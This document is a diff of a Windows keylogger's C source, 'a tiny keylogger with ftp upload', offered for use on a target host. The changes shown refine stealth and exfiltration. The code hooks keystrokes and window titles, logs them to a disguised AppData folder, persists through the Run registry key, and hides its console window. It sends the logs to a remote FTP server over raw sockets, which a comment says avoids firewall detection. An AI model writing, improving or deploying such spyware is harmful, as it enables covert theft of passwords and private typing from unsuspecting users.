@@ -1,22 +1,22 @@
 /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
  *                                                                             *
- * File:        keylogger.c                                                    *
+ * file:        keylogger.c                                                    *
  *                                                                             *
- * Purpose:     a tiny keylogger with ftp upload.                              *
+ * purpose:     a tiny keylogger with ftp upload.                              *
  *                                                                             *
- * Usage:       + configure keylogger.h header                                 *
+ * usage:       + copy config.def.h to config.h and edit                       *
  *              + compile (with MinGW):                                        *
- *                gcc.exe keylogger.c -lwsock32 -o <name.exe> -s -Os           *
+ *              $ gcc.exe keylogger.c -lwsock32 -o <name.exe> -s -Os           *
  *              + copy <name.exe> to host                                      *
  *              + run it and ... profit :)                                     *
  *                                                                             *
- * By:          s [dot] alex [at] mail [dot] ru                                *
+ * coded by:    chinarulezzz, s.alex08@mail.ru                                 *
  *                                                                             *
  * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
  *                                                                             *
  * NOTE:                                                                       *
- *      from WinXP log coming in CP1251 encoding.                              *
- *      from Win7-Win8 in UTF-16LE.                                            *
+ *              from WinXP log file is coming in CP1251 encoding               *
+ *              from Win7-Win8 in UTF-16LE                                     *
  *                                                                             *
  * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
 
@@ -29,20 +29,20 @@
 #include <time.h>
 #include <stdio.h>
 
-#include "keylogger.h"
+#include "config.h"
 
 #define AUTORUN "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define APPDATA "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
 
 #define BUFSIZE 255
 
-/* current executable's name and location */
+/* Full file path and name to the current executable */
 wchar_t exeLocation[BUFSIZE];
 
-/* save log to %APPDATA%\Microsoft\Crypto directory */
+/* Save log to %APPDATA%\Microsoft\Crypto directory */
 wchar_t logLocation[BUFSIZE];
 
-/* store window title */
+/* Store window title */
 wchar_t prevWindowText[BUFSIZE];
 
 
@@ -59,20 +59,21 @@ LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
   if (logFile == NULL)
     {
       perror ("_wfopen in LowLevelKeyboardProc");
-      exit (1);                 /* Critical error */
+      exit (1);        /* Critical error: we really need to have log file */
     }
 
   if (wParam == WM_KEYUP)       /* When the key has been pressed and released */
     {
       HWND current_window = GetForegroundWindow ();
 
-      /* win title */
+      /* If current window have title */
       if (GetWindowTextLength (current_window))
         {
-
+          /* Get current title */
           wchar_t currWindowText[BUFSIZE];
           GetWindowTextW (current_window, currWindowText, BUFSIZE);
 
+          /* If it differs from the previous */
           if (wcscmp (prevWindowText, currWindowText) != 0)
             {
               time_t now;
@@ -86,7 +87,7 @@ LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
               fwprintf (logFile, L"\n\n\n[%ls %s]\n", dateTime,
                         currWindowText);
             }
-
+          /* Store current window title */
           wcscpy (prevWindowText, currWindowText);
         }
 
@@ -119,7 +120,7 @@ LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
 /*
  * This function is called by timer for sending a log file to ftp server.
  * Is used low-level sockets instead of wininet library, because
- * usage if wininet is detected by windows firewall (at win7 exactly).
+ * usage if wininet is detected by windows firewall (e.g. at win7).
  */
 unsigned CALLBACK
 send2ftp (void *arg)
@@ -135,7 +136,7 @@ send2ftp (void *arg)
       if (WSAStartup (0x101, &ws) != NO_ERROR)
         {
           fprintf (stderr, "WSAStartup: %d\n", WSAGetLastError ());
-          continue;             /* is not critical, try another time */
+          continue;             /* It is not critical, try another time */
         }
 
       /* Open up a socket for out tcp/ip session */
@@ -183,7 +184,7 @@ send2ftp (void *arg)
       send (sock, buf, strlen (buf), 0);
       recv (sock, buf, sizeof (buf), 0);
 
-      /* Set the type of file to be transferred: binary data */
+      /* Transferring file as a binary stream of data instead of text */
       sprintf (buf, "TYPE I\r\n");
       send (sock, buf, strlen (buf), 0);
       recv (sock, buf, sizeof (buf), 0);
@@ -255,7 +256,8 @@ send2ftp (void *arg)
         }
 
       /* Begins transmission of a file to the remote site.
-       * remote file name is "MACHINE.TIMESTAMP"                        */
+       * Remote file name is "MACHINE.UNIX_TIMESTAMP"                   */
+
       sprintf (buf, "STOR %s.%i\r\n", MACHINE, (int) time (NULL));
       send (sock, buf, strlen (buf), 0);
       recv (sock, buf, sizeof (buf), 0);
@@ -296,7 +298,9 @@ main (int argc, char **argv)
 
   /* Create stealth (window is not visible) */
   HWND stealth = FindWindowA ("ConsoleWindowClass", NULL);
-  /*ShowWindow(stealth, 0); */
+#ifndef DEBUG
+  ShowWindow (stealth, 0);
+#endif
 
   setlocale (LC_CTYPE, "");
 
@@ -350,8 +354,12 @@ main (int argc, char **argv)
   /* Set the event the first time 30 seconds */
   li.QuadPart = -(30 * 10 * 1000 * 1000);
 
-  /* After calling SetWaitableTimer every `SEND_LOG_PERIOD` time */
-  SetWaitableTimer (timer, &li, SEND_LOG_PERIOD, 0, 0, 0);
+  /* After calling SetWaitableTimer set timer at `SEND_LOG_PERIOD` */
+  if (! SetWaitableTimer (timer, &li, SEND_LOG_PERIOD, 0, 0, 0))
+    {
+      fprintf (stderr, "CreateWaitableTimer failed: %d\n", GetLastError ());
+      exit (1);                         /* Critical error */
+    }
 
   /* Run ftp upload in background thread.
    *
@@ -362,7 +370,7 @@ main (int argc, char **argv)
   if (_beginthreadex (0, 0, send2ftp, (void *) timer, 0, 0) == 0)
     {
       perror ("_beginthreadex failed");
-      _endthreadex (0);
+      exit (1);                         /* Critical error */
     }
 
   /* Retrieve the application instance */
@@ -379,9 +387,7 @@ main (int argc, char **argv)
       DispatchMessage (&msg);
 
   UnhookWindowsHookEx (kbdhook);
-  KillTimer (timer);
 
-  /* system ("pause"); */
   return 0;
 }
 
